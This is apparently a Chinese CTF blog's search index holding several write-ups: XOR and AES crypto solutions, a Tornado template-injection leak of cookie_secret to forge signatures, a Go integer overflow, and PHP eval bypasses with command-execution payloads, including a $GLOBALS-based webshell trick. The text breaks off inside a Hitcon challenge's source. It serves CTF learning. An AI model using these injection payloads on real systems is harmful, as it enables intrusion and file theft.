<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>护网杯部分题目题解</title>
      <link href="/2018/10/14/huwang-game/"/>
      <url>/2018/10/14/huwang-game/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>护网杯的这次比赛还是很有收获的，至少在web方面我认为是这样<a id="more"></a>的。。。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="迟来的签到"><a href="#迟来的签到" class="headerlink" title="迟来的签到"></a>迟来的签到</h4><p><code>AAoHAR1UIFBSJFFQU1AjUVEjVidWUVJVJVZUIyUnI18jVFNXVRs=</code><br>题目说要异或，那就直接爆破异或就好<br>写个小脚本就可以得到flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line">a = <span class="string">"AAoHAR1UIFBSJFFQU1AjUVEjVidWUVJVJVZUIyUnI18jVFNXVRs="</span></span><br><span class="line">a = base64.b64decode(a)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>):</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">s  = s+chr(i^ord(j))</span><br><span class="line"><span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> s:</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure></p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="fez"><a href="#fez" class="headerlink" title="fez"></a>fez</h4><p>这个题目是我队友做的。。。。赛后才学习的，看来密码学以后还得认真上课。。。。<br>Fez.log给出三条数据，第一条为test，第二条为test与k加密后的数据，第三条为flag与k加密后的数据<br>fez.py为加密算法，通过分析算法</p><p><img src="https://s1.ax1x.com/2018/10/13/iUC4te.jpg" alt="iUC4te.jpg"></p><p>即a，b每一位进行异或运算<br><img src="https://s1.ax1x.com/2018/10/13/iUCHXt.jpg" alt="iUCHXt.jpg"><br>Round函数将M左右部分互换，并对右部分进行异或运算得 <code>R^L^k[i]</code><br>Fez函数即将k数组每个元素与m进行<code>round</code>运算<br>可得m为字符串分为<code>m[0:27]</code>,<code>m[27:54]</code>两部分通过一步一步推算<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">m:  L + R</span><br><span class="line">R + a    a: L^R^k0</span><br><span class="line">a + b    b: L^k0^k1</span><br><span class="line">b +    c    c: R^k0^k1    </span><br><span class="line">c + d    d: L^k0^k2^k3</span><br><span class="line">d + e    e: L^k0^k1^k3^k4</span><br><span class="line">e + f    f: R^k1^k2^k4^k5</span><br><span class="line">f + g    g: L^R^k0^k1^k3^k5^k6</span><br></pre></td></tr></table></figure></p><p>根据异或运算得特性<br>已知test(也就是L，R),fez(test,k)(也就是f,g)，即可通过test与fez(test,k) 进行异或运算可得出 <code>k0^k1^k3^k5^k6</code> ，<code>k1^k2^k4^k5</code><br>从而还原flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(a)==len(b)</span><br><span class="line">    c=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c+=chr(ord(a[i])^ord(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"> </span><br><span class="line">test = <span class="string">'50543fc0bca1bb4f21300f0074990f846a8009febded0b2198324c1b31d2e2563c908dcabbc461f194e70527e03a807e9a478f9a56f7'</span></span><br><span class="line">test = binascii.a2b_hex(test)</span><br><span class="line">test_k = <span class="string">'66bbd551d9847c1a10755987b43f8b214ee9c6ec2949eef01321b0bc42cffce6bdbd604924e5cbd99b7c56cf461561186921087fa1e9'</span></span><br><span class="line">test_k = binascii.a2b_hex(test_k)</span><br><span class="line">m_k = <span class="string">'44fc6f82bdd0dff9aca3e0e82cbb9d6683516524c245494b89c272a83d2b88452ec0bfa0a73ffb42e304fe3748896111b9bdf4171903'</span></span><br><span class="line">m_k = binascii.a2b_hex(m_k)</span><br><span class="line"> </span><br><span class="line">l = test[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">r = test[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">l1 = test_k[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">r1 = test_k[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">l2 = m_k[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">r2 = m_k[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line"> </span><br><span class="line">c = xor(xor(l,r),r1)</span><br><span class="line">Lr = xor(c,r2)</span><br><span class="line">d = xor(r,l1)</span><br><span class="line">R = xor(d,l2)</span><br><span class="line">L = xor(Lr,R)</span><br><span class="line">m = L+R  </span><br><span class="line"><span class="keyword">print</span> m</span><br></pre></td></tr></table></figure></p><p><a href="https://imgchr.com/i/iUP9cn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/13/iUP9cn.md.png" alt="iUP9cn.md.png"></a></p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p>这里的web题目是我趁着题目还没关的时候赶紧复现的（不会做后面弄懂也是学习的方法呀23333），感谢一叶飘零学长的帮助哇。。。。</p><h4 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy tornado"></a>easy tornado</h4><p>这个题目上来每个选项url就很可疑<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.95.5:31792/file?filename=Orz.txt&amp;signature=d227ce6c7cea5a9cd7f1721e0baace7d</span><br><span class="line"></span><br><span class="line">Orz.txt</span><br><span class="line">render() </span><br><span class="line"></span><br><span class="line">http://49.4.95.5:31792/file?filename=hint.txt&amp;signature=c7b8660e245f1360c378db1074a2a4c7</span><br><span class="line"></span><br><span class="line">hint.txt</span><br><span class="line">md5(cookie_secret + md5(filename)) </span><br><span class="line"></span><br><span class="line">http://49.4.95.5:31792/file?filename=flag.txt&amp;signature=d24b2dc1952a495057af1a898c55931b</span><br><span class="line"></span><br><span class="line">flag.txt</span><br><span class="line">/fllllllllllag</span><br></pre></td></tr></table></figure></p><p>很明显是去读文件<code>/fllllllllllag</code> ，并且要带上签名，一开始我做这个题的时候还以为强行爆破一波secret。。。还一度认为是Hash长度拓展攻击。。。。尴尬</p><p>关键点在于<code>cookie_secret</code></p><p>当我们随便输入东西的时候会出现一个报错页面<br><a href="https://imgchr.com/i/iUPn39" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/14/iUPn39.md.png" alt="iUPn39.md.png"></a></p><p>这个页面过滤了很多东西，并且返回Orz</p><p>输入</p><p><code>http://49.4.95.5:31792/error?msg=</code></p><p><a href="https://imgchr.com/i/iUPucR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/14/iUPucR.md.png" alt="iUPucR.md.png"></a></p><p>这里的话飘零大佬说可以进行模板注入，并且只能读一个变量<br>接下来的思路才是骚，直接阅读tornado的源码<br><code>https://github.com/tornadoweb/tornado/blob/master/tornado/auth.py</code></p><p>在<code>handler.settings</code> 里面存在<code>cookie_secret</code>这东西</p><p>读取一下</p><p><code>http://49.4.95.5:31792/error?msg=</code></p><p>注意一下，这里的两个大括号{}是起到渲染模板的作用。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Whoops, looks like somethings went wrong . </span><br><span class="line">&#123;&apos;login_url&apos;: &apos;/login&apos;, &apos;template_path&apos;: &apos;templates&apos;, &apos;xsrf_cookies&apos;: True, &apos;cookie_secret&apos;: &apos;B3&#125;r8at^62-?kGW&lt;!YJ&#123;Kl]zEZep@Nd)$H%*~9fh15.s[&gt;&amp;T+(7P4uQ0UVXDOiFb&apos;, &apos;debug&apos;: False, &apos;file_path&apos;: &apos;/www/static/files&apos;, &apos;static_path&apos;: &apos;static&apos;&#125;</span><br></pre></td></tr></table></figure><p>可以把里面的内容给读出来，以后还是得对python的MVC架构学习一下才行。。</p><p>立即构造签名<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5(<span class="string">'B3&#125;r8at^62-?kGW&lt;!YJ&#123;Kl]zEZep@Nd)$H%*~9fh15.s[&gt;&amp;T+(7P4uQ0UVXDOiFb'</span>.md5(<span class="string">'/fllllllllllag'</span>)) ;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><code>http://49.4.95.5:31792/file?filename=/fllllllllllag&amp;signature=3e9f949b7c37c999287eb096f576be00</code></p><p>得到flag<br><a href="https://imgchr.com/i/iUPKj1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/14/iUPKj1.md.png" alt="iUPKj1.md.png"></a></p><h4 id="ltshop"><a href="#ltshop" class="headerlink" title="ltshop"></a>ltshop</h4><p>这个题目一开始我一直以为是前端的<code>ajax</code>的操作问题，直到看了飘零大哥的wp才知道有两种思路，一种是条件竞争，但条件竞争好像还是有上限的，开个多线程跑一下，这也是为了后面的怪异的<code>9999999</code>做铺垫,因为你没有5个以上的大辣条是换不了辣条之王的。<br><img src="https://s1.ax1x.com/2018/10/14/iUP1HK.png" alt="iUP1HK.png"><br>然后就会发现辣条数目几变成7个<br><img src="https://s1.ax1x.com/2018/10/14/iUP8AO.png" alt="iUP8AO.png"></p><p>下面才是重点，因为这里是用的是Go语言，很可能存在整数溢出，可以参考一下这篇文章<br><a href="http://www.it1352.com/808569.html" target="_blank" rel="noopener">http://www.it1352.com/808569.html</a></p><p>go语言整数溢出为<code>18446744073709551615</code>，然后可以计算<code>number=(18446744073709551615/5)+1=3689348814741910324</code>，然后我们可以直接溢出获得flag<br>下面这篇博客对于溢出过大有更深的理解:<br><a href="https://qingchenldl.github.io/2018/10/13/护网杯WP-BitPwn/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://qingchenldl.github.io/2018/10/13/护网杯WP-BitPwn/?tdsourcetag=s_pctim_aiomsg</a></p><p><a href="https://imgchr.com/i/iUPGND" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/14/iUPGND.md.png" alt="iUPGND.md.png"></a></p><p>还有一道题目是关于Laravel框架的解题过程，也是秀，知识点也很多，建议去看看一叶飘零学长的博客啦。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>这比赛又学到了不少的东西，果然python开发出来的web框架还是自己的弱项，条件竞争这东西看来现在比赛都很流行呢，可惜自己对这方面的做题敏感度不够，以前一直认为这只有安恒的月赛才会出，以后还是得接触pwn了，继续努力。。。。。</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CUMT平台的部分题解</title>
      <link href="/2018/09/30/CUMT-CTF-Platform/"/>
      <url>/2018/09/30/CUMT-CTF-Platform/</url>
      <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">请输入密码</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>安恒9月部分赛题复现</title>
      <link href="/2018/09/30/anheng-9month/"/>
      <url>/2018/09/30/anheng-9month/</url>
      <content type="html"><![CDATA[<blockquote><p>To be patient…</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>赶紧趁着电脑的屏幕修好了，刚好安恒的web题目有复现，赶紧做。。。。。又从这几个题目里面学习到新知识了<a id="more"></a>小结一下</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="babybypass"><a href="#babybypass" class="headerlink" title="babybypass"></a>babybypass</h4><p>这个题目我记得我当初做的时候是一直考虑着用<code>$</code>以及<code>_</code>去绕过这些数字字母之类的东西，突然发现他这个题目里面把那个<code>$</code>以及<code>_</code>也经过了过滤，这样的话就少了很多可能性，而且这题比原题的限制长度小了，更有难度。现在就开始总结一下从这个题目学到的知识点<br>1.php短标签输出，这个知识点很久之前就已经见过。<br><code>&lt;?=?&gt;</code>这个就是短标签，相当于<code>&lt;?php echo …;?&gt;</code>一般在php的配置文件<code>php.ini</code>中有一个<code>short_open_tag</code>的值，开启以后可以使用PHP的短标签：<code>&lt;? ?&gt;</code>，但是在现实开发中一般不推崇这种做法。。<br>但这个题目就很巧妙用了这个东西<br>2.第二个就是关于php函数eval函数的一些东西，这里的php执行函数是eval，在php官方手册上面有这样一句话，这是一个坑了，要想执行代码的话，我们就需要先用<code>?&gt;</code>去闭合，把上一段代码就给结束离开 ，然后我们才可以利用<code>&lt;?=?&gt;</code>去输出<br><a href="https://imgchr.com/i/ilI9II" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilI9II.md.png" alt="ilI9II.md.png"></a></p><p>区别一下有些系统执行函数比如system(有回显)，exec(没回显)，以及反引号这类的，这是直接执行系统函数的，一会我们也会用到<br><img src="https://s1.ax1x.com/2018/09/30/ilIPit.png" alt="ilIPit.png"><br><img src="https://s1.ax1x.com/2018/09/30/ilIiJP.png" alt="ilIiJP.png"></p><p>3.Linux通配符的作用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*        代表『 0 个或无穷多个』任意字符</span><br><span class="line">?        代表『一定有一个』任意字符</span><br></pre></td></tr></table></figure></p><p>4.Linux 下面一切皆文件<br>就是说我们平常一般在下面Linux下面的输入的命令，都可以通过文件去同样的执行，这对我来说是新知识。。。。。<br><img src="https://s1.ax1x.com/2018/09/30/ilIMiq.png" alt="ilIMiq.png"></p><p>然后我们就可以去实现payload，这个题目是Apache搭的，我们可以去默认目录先查看一波文件，一般来说默认目录在<code>/var/www/html</code></p><p>构造<code>code=?&gt;&lt;?=`/???/??? /???/???/????/*`;?&gt;</code>相当于<code>code=?&gt;&lt;?=` /bin/cat /var/www/html/*`;?&gt;</code></p><p>然后会发现php代码里面的源代码getflag那一部分的函数是是从/flag里面读取的。。。。听说这题的getflag函数也是个坑。。好像不能直接从url里面调用</p><p>所以再来构造一下<br><code>code=?&gt;&lt;?=`/???/??? /????`;?&gt;</code>相当于<code>code=?&gt;&lt;?=` /bin/cat /flag`;?&gt;</code>得到flag<br><a href="https://imgchr.com/i/ilIQJ0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIQJ0.md.png" alt="ilIQJ0.md.png"></a></p><h4 id="神奇的CMS"><a href="#神奇的CMS" class="headerlink" title="神奇的CMS"></a>神奇的CMS</h4><p>进入网站发现有用户登录，然后测试发现弱密码<br><code>admin admin123</code></p><p>然后点击几个模块发现有两个模块有点奇怪<br><a href="https://imgchr.com/i/ilIlWV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIlWV.md.png" alt="ilIlWV.md.png"></a></p><p>这两个模块一个模块有提示，另一个模块存在输入并且存在回显<br>先看提示，一是让你下载源码包，另外是提示flag在哪，先把源码包下载下来，源码里面有两个控制器，一个是<code>content</code>，另一个是<code>site</code></p><p>发现是Yii框架的东西，幸亏我还是做过Yii框架的开发的，对此还是有点小熟悉。。。</p><p>这里看回放的时候还是学到点东西的，就是我们在代码审计的时候一般要找有输入有输出的地方，这里很可能就存在这漏洞，这就相当于在脑里面建了一个模型，但是想想也很正常，平常我们学编程的时候也没过多的去考虑编程的输入输出，比如我们在一开始用C编程的时候你会忘掉除数不为0的前提吗？所以说我们更多的是考虑代码的核心功能能否实现。</p><p>所以在<code>ADD_IMG</code>(因为有输入有回显)页面里面就很有可能存在漏洞了，所以我们得专注代码里面描述这一段东西的内容</p><p> Yii框架讲究的是MVC架构，一般代码审计的话得先找<code>Controller</code>里面的东西毕竟都是些逻辑性的东西，关键的功能也在里面<br>所以在这个url里面的site是指的控制器，而backup就是site控制器里面的操作<br><img src="https://s1.ax1x.com/2018/09/30/ilI8QU.png" alt="ilI8QU.png"><br>我以前的博客讲过<br><a href="https://imgchr.com/i/ilIdF1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIdF1.md.png" alt="ilIdF1.md.png"></a></p><p>从代码里面你会发现<code>site</code>控制器里面都是些展示页面以及登陆的功能，但是不要过分以为登录里面会有sql注入，毕竟Yii框架里面是可以通过对login函数设置<code>rules</code>再来通过<code>validate</code>去检测是否出现SQL注入，所以出现sql注入机率不大</p><p>但是在回放里面学到了一种更骚气的代码调试的方法。。就是当你不懂框架的时候如何将其变成普通的php代码进行调试<br>这个方法就是将跟框架有关的东西去掉把关于框架的类看成一个普通的类，再把跟业务逻辑以及数据库相关操作的功能有关的去掉，然后新建那个类，单纯测试一下那个输入输出的函数就好</p><p>尝试调试，我这里用的phpstorm去调试，在<code>parstIf</code>函数下了断点，发现执行到下图所示的地方就会重新返回到echo输出语句中<br><a href="https://imgchr.com/i/ilIrQO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIrQO.md.png" alt="ilIrQO.md.png"></a><br>说明要在字符串里面加上<code>{if</code>此类的字符串<br>随便找一个地方加加，为的是能够进入else的循环<br><a href="https://imgchr.com/i/ilIbwj" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIbwj.md.png" alt="ilIbwj.md.png"></a><br>进入else会发现到<code>buildregx</code>又会有一个新的函数，其实这个函数就是为了构建一个正则表达式，在字符串前后添加<code>/</code>，可以从debug的结果看得出来<br><a href="https://imgchr.com/i/ilIqTs" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIqTs.md.png" alt="ilIqTs.md.png"></a><br>这时候我们就需要匹配<code>/{if:(.*?)}(.*?){end if}/is</code>这样的正则，但是之前的输入会导致其跳出该循环，从而又直接返回了结果，不能进入到for循环里面执行eval函数<br><a href="https://imgchr.com/i/ilIXYq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIXYq.md.png" alt="ilIXYq.md.png"></a><br>这时候就又需要构建对应的东西了，我们把正则里面的<code>(.*?)</code>改为自己随意的内容就好<br><a href="https://imgchr.com/i/ilIjf0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIjf0.md.png" alt="ilIjf0.md.png"></a><br>然后再追踪一次变化过程，经过<code>preg_match_all</code>这个函数的时候我们就可以看到这个函数会把原来的匹配的字符分成三段，首先是<code>iar[0][0]</code>是匹配到的字符串<code>{if:2333}23333{end if}</code>，然后是分别是第一个任意内容以及第二个任意内容匹正则配到的字符串，<code>iar[1][0]=2333,iar[2][0]=23333</code></p><p>继续走的话，这时候就可以进行一次循环了，因为现在arlen=1,然后我们就可以继续执行下去了，后买的事情就很简单了，先是判断<code>iar[1][0]</code>以及<code>iar[2][0]</code>里面是否有等号，再判断一下<code>iar[2][0]</code>里面是否有<code>{elseif</code>以及<code>else</code>，这几个判断都不影响<br><a href="https://imgchr.com/i/ilopXF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilopXF.md.png" alt="ilopXF.md.png"></a><br>最后还是将<code>iar[1][0]</code>放在这个eval语句里面执行<br><a href="https://imgchr.com/i/iloCm4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/iloCm4.md.png" alt="iloCm4.md.png"></a><br>梳理一下逻辑也就是说检查最少的是<code>iar[1][0]</code>，只检查他是否存在<code>=</code>，那就好办了，在eval语句中我们只需要对<code>iar[1][0</code>]闭合一下语句我们就可以执行我们想要的命令即可</p><p>Payload<br><code>{if:1)print_r(`cat /tmp/flag`);die();//}123{end if}</code>第一种思路直接在里面拼接命令执行语句即可<br><img src="https://s1.ax1x.com/2018/09/30/iloi79.png" alt="iloi79.png"></p><p>第二种思路就是在没有过滤<code>$GOLBALS</code>全局变量的前提下使用拼接，但个人感觉这东西会在PHP开发中给禁掉吧毕竟可能会对代码里面的其他变量造成影响，这个套路一般都是用来写过waf的小马用的</p><p><code>{if:1)$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]($GLOBALS[&#39;_G&#39;.&#39;ET&#39;][b]);die();//}{end if}</code></p><p>尝试这个的是时候还以为服务器坏了。。。突然发现<code>processing request</code>。。。应该是没传参，传参了就好了</p><p><a href="https://imgchr.com/i/iloAt1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/iloAt1.md.png" alt="iloAt1.md.png"></a></p><p><a href="https://imgchr.com/i/iloM0H" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/iloM0H.md.png" alt="iloM0H.md.png"></a><br><a href="https://imgchr.com/i/iloQ7d" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/iloQ7d.md.png" alt="iloQ7d.md.png"></a></p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="简单加密"><a href="#简单加密" class="headerlink" title="简单加密"></a>简单加密</h4><p>这个题目帮我复习了一下信息安全数学基础第一章的内容，所以我就记录一下这个题目，其他题目就不写了</p><p>这个关键点就是作取余运算的时候结果是不会超过余数的，如果有打过ACM的人就会知道有一个叫快速幂的东西跟这个也差不多，极大地降低了代码所需要的空间度，使得数不会越界</p><p>观察主函数现在我们需要的就是<code>passwd</code>这个参数，但是从<code>generate_passwd</code>是得到最多<code>passwd</code>不会超过<code>0xB18E</code>，所以我们就可以选择爆破<br><a href="https://imgchr.com/i/ilo3tI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilo3tI.md.png" alt="ilo3tI.md.png"></a></p><p>跑一下脚本就可以得到flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(data, password)</span>:</span></span><br><span class="line">    bs = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + (bs - len(s) % bs) * chr(bs - len(s) % bs)</span><br><span class="line">    iv = <span class="string">"0102030405060708"</span></span><br><span class="line">    cipher = AES.new(password, AES.MODE_CBC, iv)</span><br><span class="line">    data = cipher.encrypt(pad(data))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(data, password)</span>:</span></span><br><span class="line">    unpad = <span class="keyword">lambda</span> s : s[<span class="number">0</span>:-ord(s[<span class="number">-1</span>])]</span><br><span class="line">    iv = <span class="string">"0102030405060708"</span></span><br><span class="line">    cipher = AES.new(password, AES.MODE_CBC, iv)</span><br><span class="line">    data  = cipher.decrypt(data)</span><br><span class="line">    <span class="keyword">return</span> unpad(data)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_passwd</span><span class="params">(key,result)</span>:</span></span><br><span class="line">    data_halt = <span class="string">"LvR7GrlG0A4WIMBrUwTFoA=="</span>.decode(<span class="string">"base64"</span>)</span><br><span class="line">    rand_int =  int(decrypt(data_halt, key).encode(<span class="string">"hex"</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="comment">#round = 0x7DC59612</span></span><br><span class="line">    result = result * (rand_int % <span class="number">0xB18E</span>) % <span class="number">0xB18E</span></span><br><span class="line">    <span class="keyword">return</span> encrypt(str(result), key)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    key = <span class="string">'17abeca4cc4c432a52c2b7f6d24d1888'</span></span><br><span class="line">    </span><br><span class="line">    output = <span class="string">"u6WHK2bnAsvTP/lPagu7c/K3la0mrveKrXryBPF/LKFE2HYgRNLGzr1J1yObUapw"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> range(<span class="number">0xB18E</span>):</span><br><span class="line">        passwd = generate_passwd(key.decode(<span class="string">"hex"</span>),result)</span><br><span class="line">        r = decrypt(output.decode(<span class="string">"base64"</span>), passwd)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> r:</span><br><span class="line">            <span class="keyword">print</span> r</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hitcon2017 babyfirst-revenge v2复现</title>
      <link href="/2018/09/18/hitcon2017-babyfirstv2/"/>
      <url>/2018/09/18/hitcon2017-babyfirstv2/</url>
      <content type="html"><![CDATA[<p>这个题目的条件更加苛刻了，先放个源码<a id="more"></a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    